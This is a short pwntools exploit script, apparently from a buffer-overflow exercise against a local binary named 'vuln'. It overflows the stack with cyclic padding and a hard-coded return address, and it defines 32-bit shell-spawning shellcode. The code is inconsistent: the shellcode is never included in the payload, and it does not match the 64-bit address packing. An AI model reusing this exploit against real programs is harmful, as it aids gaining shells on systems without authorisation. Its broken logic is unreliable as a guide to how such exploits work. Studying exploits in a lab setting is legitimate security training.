from pwn import *

# run local process (vuln program)
proc = process('./vuln') 

gdb.attach(proc, '''
echo "hi"
# break main
continue
''')
proc.recvline() 

padding = cyclic(264)
eip= p64(0x7fffffffdbd0)
shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
payload = padding+eip

proc.sendline(payload)
proc.interactive()


#we write to 0x7fffffffdbd0


